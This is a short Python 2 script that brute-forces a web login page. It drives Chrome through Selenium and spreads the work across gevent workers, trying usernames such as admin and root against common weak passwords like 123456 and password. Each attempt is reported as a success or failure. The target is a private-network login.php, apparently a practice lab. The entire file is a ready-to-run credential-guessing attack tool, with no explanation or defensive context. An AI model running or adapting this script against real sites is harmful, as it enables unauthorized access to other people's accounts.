#!/usr/bin/env python
# -*- coding: utf-8 -*-
from gevent import monkey;monkey.patch_all()
import gevent
from selenium import webdriver
import time
import Queue

userList = ['Bob', 'admin', 'test', 'root', 'Hack']
userQueueList = Queue.Queue()

for u in userList:
    userQueueList.put(u)


def f(login_url):
    global userQueueList

    passList = ['123456', '666666', 'password', 'admin', 'web', 'oracle']
    brower = webdriver.Chrome(chrome_options=webdriver.ChromeOptions())

    while not userQueueList.empty():
        username = userQueueList.get()
        for password in passList:
            brower.get(login_url)
            time.sleep(0.5)
            userPATH = '//*[@id="content"]/form/fieldset/input[1]'
            passPATH = '//*[@id="content"]/form/fieldset/input[2]'
            SubmitPATH = '//*[@id="content"]/form/fieldset/p/input'
            brower.find_element_by_xpath(userPATH).send_keys(username)
            time.sleep(0.3)
            brower.find_element_by_xpath(passPATH).send_keys(password)
            time.sleep(0.3)
            brower.find_element_by_xpath(SubmitPATH).click()
            time.sleep(0.5)
            if not (brower.current_url == login_url):
                print '\033[94m' + '\033[1m' + 'LOGIN SUCCESS!' + '\033[0m', username, password
            else:
                print '\033[91m' + '\033[1m' + 'LOGIN FAILED!' + '\033[0m', username, password
                time.sleep(0.5)
                continue

if __name__ == '__main__':

    gevent.joinall([gevent.spawn(f, 'http://192.168.6.72/login.php') for i in range(0, 2)])
